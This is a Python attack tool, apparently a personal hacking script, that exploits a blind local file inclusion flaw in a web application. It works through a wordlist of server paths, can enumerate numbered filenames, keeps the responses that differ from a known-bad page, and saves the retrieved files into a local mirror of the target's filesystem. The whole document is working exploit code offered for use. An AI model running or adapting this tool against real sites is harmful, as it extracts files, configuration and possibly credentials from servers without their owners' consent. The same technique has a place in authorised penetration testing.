import argparse
import requests
import os
import errno
import re
import codecs

### ARG BLOCK ###
ap = argparse.ArgumentParser(description="a tool used to map a filesystem though local file inclusion, when you encounter a blind LFI situation",epilog="WARNING: im still new to python, so im not doing much error checking on the URL's. if its not working, double check your -u")
ap.add_argument('-u', '--url', metavar="web.com/lfi.php?file=" ,help="enter the url to do LFI on. ex: http://www.example.com/file.php?page= ",nargs=1, required=True)
ap.add_argument('-f', '--infile', metavar="<file>", help="choose an infile to use for scanning (`find --type d <folder> > file.out` seems to work well)", nargs=1, required=True)
ap.add_argument('-r', '--rate', metavar="<int>checks per second" ,help="[not implimented yet]set a rate limit. use 0, or leave undefined for UNLIMITED SPEED!",default = 0, type=int, nargs=1)
ap.add_argument('-o', '--output-root', metavar="<file>", help="the root directory that files will be written to. default is ./chroot", default="chroot", nargs=1)
ap.add_argument('-e', '--enumerate' , metavar="<bool>", help="files with numbers in them will be enumerated up to the padding. '0-file' will be enumerated from 0 to 9. '00-file' will be enumerated from 0 to 99", default=False, type=bool, nargs =1)
ap.add_argument('-l', '--enum-limit' , metavar="<int>", help="number of characters you want to limit for enumeration. for example, if this is set to 3, 000-file will still enumerate, but 0000-file will not.", default=0, type=int, nargs =1)

### FUNCTION BLOCK ###
def writeFile(path, data):
	dirtree = os.path.dirname(path)
	makePath(dirtree)
	file = codecs.open( path, "w+", encoding='utf8')
	file.write(data)
	file.close()

def makePath(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise

def find_number_in_filename(path):
    # remove the path and the extension
    head, tail = os.path.split(path)
    head = os.path.join(head, "") # include / or \ on the end of head if it's missing
    fn, ext = os.path.splitext(tail)

    m = re.match(r"(\d+)([A-Za-z\-\_]+)$", fn)
    if m:
        prefix, suffix, num_length = head, m.group(2)+ext, len(m.group(1))
        return prefix, suffix, num_length
    m = re.match(r"([A-Za-z\-\_]+)(\d+)$", fn)
    if m:
        prefix, suffix, num_length = head+m.group(1), ext, len(m.group(2))
        return prefix, suffix, num_length
    return path, "", 0

def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1


### CODE ENTRY POINT ###
args = ap.parse_args()

#get a known bad page
badsite = requests.get(args.url[0] + "thiscantbeanactualpage_1092817163jahdial")

filelen = file_len(args.infile[0])
linenum = 0
percent = 2

with open(args.infile[0],'r') as files:
	urlends = files.readlines()

for lines in urlends:
	linenum += 1
	#if(float(linenum) / float(filelen) * 100 > percent):
	print(str(float(linenum) / float(filelen) * 100)+"%...")
		#percent+=2

	if args.enumerate[0] == True:
		prefix, suffix, num_length = find_number_in_filename(lines.strip('\n')) # scan for numbers and split
		if num_length == 0 or num_length > args.enum_limit[0]: #if no numbers are found... just do the non enumerated bit of code.
			website = requests.get(args.url[0] + lines.strip('\n'))
			if website.text != badsite.text:
				writeFile(args.output_root[0] + lines.strip('\n') ,website.text)
		else: #HEY! we have numbers to enumerate!
			all_numbered_versions = [("%s%0"+str(num_length)+"d%s") % (prefix, ii, suffix) for ii in range(0,10**num_length)]
			for element in all_numbered_versions:
				print("\tenum ("+str(element)+" out of "+str(10**num_length - 1)+" total numbers)")
				website = requests.get(args.url[0] + element)
				if website.text != badsite.text:
					writeFile(args.output_root[0] + element , website.text)
	else:
		website = requests.get(args.url[0] + lines.strip('\n'))
		if website.text != badsite.text:
			writeFile(args.output_root[0] + lines.strip('\n') ,website.text)
print("100%")